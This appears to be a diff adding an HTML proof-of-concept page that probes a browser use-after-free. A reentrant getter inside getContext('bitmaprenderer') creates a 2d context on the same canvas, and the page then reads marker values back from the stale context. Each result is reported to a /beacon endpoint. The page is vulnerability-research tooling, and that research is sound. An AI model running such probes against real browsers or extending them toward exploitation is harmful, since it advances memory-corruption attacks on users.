@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V595</title></head>
+<body><pre id="out">V595 — Post-UAF stale state readback diagnostic</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function log(m){O.textContent+='\n'+m;}
+function bk(tag,d){try{new Image().src='/beacon?probe=V595&event='+tag+'?d='+encodeURIComponent(d)+'&t='+Date.now()+'&r=2';}catch(e){}}
+function hex(v){var b=new ArrayBuffer(8);new Float64Array(b)[0]=v;var u=new Uint8Array(b);var h='';for(var i=7;i>=0;i--)h+=(u[i]<16?'0':'')+u[i].toString(16);return '0x'+h;}
+
+var MK_LW=3.141592653589793;
+var MK_ML=2.718281828459045;
+var MK_GA=0.123456789012345;
+var MK_SB=77.77;
+var MK_SO=[11.11,22.22];
+var MK_DO=9.87654321;
+var MK_TX=[1.1,2.2,3.3,4.4,5.5,6.6];
+
+bk('BOOT','v595-stale-state-readback');
+
+try {
+var c1 = document.createElement('canvas');
+c1.width=8; c1.height=8;
+
+var innerCtx = null;
+var getterFired = false;
+var settings = {};
+Object.defineProperty(settings, 'alpha', { get: function() {
+    getterFired = true;
+    innerCtx = c1.getContext('2d');
+    if (!innerCtx) { bk('ERR','no-inner'); return true; }
+    innerCtx.lineWidth = MK_LW;
+    innerCtx.miterLimit = MK_ML;
+    innerCtx.globalAlpha = MK_GA;
+    innerCtx.shadowBlur = MK_SB;
+    innerCtx.shadowOffsetX = MK_SO[0];
+    innerCtx.shadowOffsetY = MK_SO[1];
+    innerCtx.lineDashOffset = MK_DO;
+    innerCtx.setTransform(MK_TX[0],MK_TX[1],MK_TX[2],MK_TX[3],MK_TX[4],MK_TX[5]);
+    innerCtx.setLineDash([1.0, 2.0, 3.0, 4.0]);
+    bk('MARKS','set-all');
+    return true;
+}});
+
+bk('S1','trigger-bmr');
+var outerCtx = c1.getContext('bitmaprenderer', settings);
+bk('S2','bmr-done,getter='+getterFired+',inner='+(!!innerCtx)+',outer='+(!!outerCtx));
+
+if (!innerCtx) { bk('ABORT','no-inner'); throw 'no inner'; }
+
+bk('S3','reading-stale');
+var R={};
+function tr(name,fn){try{var v=fn();R[name]=v;return v;}catch(e){R[name]='ERR:'+e.name;bk('CRASH-'+name,e.name);return null;}}
+
+var lw=tr('lw',function(){return innerCtx.lineWidth;});
+if(lw!==null)bk('R-LW',lw+'|'+hex(lw)+'|m='+(lw===MK_LW));
+
+var ml=tr('ml',function(){return innerCtx.miterLimit;});
+if(ml!==null)bk('R-ML',ml+'|'+hex(ml)+'|m='+(ml===MK_ML));
+
+var ga=tr('ga',function(){return innerCtx.globalAlpha;});
+if(ga!==null)bk('R-GA',ga+'|'+hex(ga)+'|m='+(ga===MK_GA));
+
+var sb=tr('sb',function(){return innerCtx.shadowBlur;});
+if(sb!==null)bk('R-SB',sb+'|m='+(Math.abs(sb-MK_SB)<0.01));
+
+var sox=tr('sox',function(){return innerCtx.shadowOffsetX;});
+if(sox!==null)bk('R-SOX',sox);
+
+var soy=tr('soy',function(){return innerCtx.shadowOffsetY;});
+if(soy!==null)bk('R-SOY',soy);
+
+var ldo=tr('ldo',function(){return innerCtx.lineDashOffset;});
+if(ldo!==null)bk('R-LDO',ldo+'|'+hex(ldo)+'|m='+(ldo===MK_DO));
+
+var tx=tr('tx',function(){return innerCtx.getTransform();});
+if(tx!==null&&typeof tx==='object')bk('R-TX','a='+tx.a+'|b='+tx.b+'|c='+tx.c+'|d='+tx.d+'|e='+tx.e+'|f='+tx.f);
+
+var ld=tr('ld',function(){return innerCtx.getLineDash();});
+if(ld!==null)bk('R-LD','len='+ld.length+(ld.length>0?'|v0='+ld[0]:''));
+
+var fs=tr('fs',function(){return innerCtx.fillStyle;});
+if(fs!==null)bk('R-FS',String(fs).slice(0,60));
+
+var ss=tr('ss',function(){return innerCtx.strokeStyle;});
+if(ss!==null)bk('R-SS',String(ss).slice(0,60));
+
+var fn2=tr('font',function(){return innerCtx.font;});
+if(fn2!==null)bk('R-FN',String(fn2).slice(0,60));
+
+var cv=tr('canvas',function(){return innerCtx.canvas;});
+if(cv!==null)bk('R-CV',cv?cv.tagName||'obj':'null');
+
+var ok=Object.keys(R).filter(function(k){return typeof R[k]!=='string'||R[k].indexOf('ERR')!==0;});
+var bad=Object.keys(R).filter(function(k){return typeof R[k]==='string'&&R[k].indexOf('ERR')===0;});
+bk('SUMMARY','ok='+ok.length+'|crash='+bad.length+'|survived='+ok.join(','));
+
+log('Survived('+ok.length+'): '+ok.join(', '));
+log('Crashed('+bad.length+'): '+bad.join(', '));
+Object.keys(R).forEach(function(k){log('  '+k+': '+R[k]);});
+bk('DONE','v595-complete');
+}catch(e){bk('FATAL',e.name+':'+e.message);log('FATAL: '+e);}
+</script></body></html>
